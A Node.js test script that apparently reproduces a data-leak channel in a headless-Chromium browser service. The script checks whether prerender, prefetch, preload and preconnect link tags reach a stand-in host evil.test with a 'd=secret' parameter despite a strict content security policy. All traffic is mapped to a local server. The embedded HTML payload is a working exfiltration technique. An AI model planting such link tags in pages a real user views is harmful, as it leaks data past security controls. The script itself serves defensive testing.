import fs from "node:fs"; import os from "node:os"; import path from "node:path"; import https from "node:https"; import { execFileSync, spawn } from "node:child_process";
// Reproduces the residual channel documented in docs/CHAT-BROWSER-2.md: run from services/browser (needs playwright-core and a Chromium binary: CHROME=path).
const { chromium } = await import("playwright-core");
const dir = fs.mkdtempSync(path.join(os.tmpdir(), "pr-"));
execFileSync("openssl", ["req","-x509","-newkey","rsa:2048","-nodes","-keyout",dir+"/k.pem","-out",dir+"/c.pem","-days","1","-subj","/CN=lab.test","-addext","subjectAltName=DNS:evil.test,DNS:lab.test,DNS:conn.evil.test"],{stdio:"ignore"});
const hits=[]; const conns=[];
const PAGE=`<!doctype html><body><link rel="prerender" href="https://evil.test/PRERENDER?d=secret"><link rel="preconnect" href="https://conn.evil.test"><link rel="dns-prefetch" href="//dns.evil.test"><link rel="prefetch" href="https://evil.test/PREFETCH?d=secret"><link rel="preload" as="fetch" href="https://evil.test/PRELOAD?d=secret">hi</body>`;
const site=https.createServer({key:fs.readFileSync(dir+"/k.pem"),cert:fs.readFileSync(dir+"/c.pem")},(req,res)=>{hits.push(req.method+" "+req.headers.host+req.url);res.writeHead(200,{"content-type":"text/html",...(globalThis.CSP?{"content-security-policy":globalThis.CSP}:{})});res.end(PAGE)});
site.on("secureConnection",(s)=>conns.push(s.servername)); 
await new Promise(r=>site.listen(0,"127.0.0.1",r)); const port=site.address().port;
const env=Object.fromEntries(Object.entries(process.env).filter(([k])=>!/proxy/i.test(k)));
const bin=process.env.CHROME||"/opt/pw-browsers/chromium-1243/chrome-linux64/chrome";
async function run(label, tweak) {
  hits.length=0; conns.length=0;
  const dbg=9600+Math.floor(Math.random()*300);
  const ud=fs.mkdtempSync(path.join(os.tmpdir(),"ud-"));
  const proc=spawn(bin,["--headless=new","--no-sandbox",`--remote-debugging-port=${dbg}`,`--user-data-dir=${ud}`,`--host-resolver-rules=MAP lab.test 127.0.0.1:${port}, MAP *.evil.test 127.0.0.1:${port}, MAP evil.test 127.0.0.1:${port}`,"--ignore-certificate-errors","about:blank"],{env,stdio:"ignore"});
  let ver; for(let i=0;i<60;i++){ try{ ver=await (await fetch(`http://127.0.0.1:${dbg}/json/version`)).json(); break;}catch{await new Promise(r=>setTimeout(r,200))}}
  const b=await chromium.connectOverCDP(ver.webSocketDebuggerUrl); const ctx=b.contexts()[0]; const page=ctx.pages()[0]??await ctx.newPage(); const cdp=await ctx.newCDPSession(page);
  await tweak?.(cdp,ctx,page);
  await page.goto("https://lab.test/browser-lab/index.html"); await new Promise(r=>setTimeout(r,2500));
  console.log("==",label,"hits:",JSON.stringify(hits.filter(h=>!/lab.test/.test(h))),"tls-servernames:",JSON.stringify([...new Set(conns)]));
  await b.close(); proc.kill(); 
}
globalThis.CSP="default-src 'none'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src data:; font-src data:; media-src 'none'; connect-src 'none'; worker-src 'none'; child-src 'none'; frame-src 'none'; object-src 'none'; base-uri 'none'; form-action 'self'; manifest-src 'none'; frame-ancestors 'none'";
await run("stock chrome WITH session CSP");
await run("stock chrome WITH session CSP + Fetch request-stage failing evil", async(c)=>{c.on("Fetch.requestPaused",async(ev)=>{ if(/evil/.test(ev.request.url)) await c.send("Fetch.failRequest",{requestId:ev.requestId,errorReason:"BlockedByClient"}).catch(()=>{}); else await c.send("Fetch.continueRequest",{requestId:ev.requestId}).catch(()=>{})});await c.send("Fetch.enable",{patterns:[{urlPattern:"*"}]})});
site.close(); fs.rmSync(dir,{recursive:true,force:true}); process.exit(0);
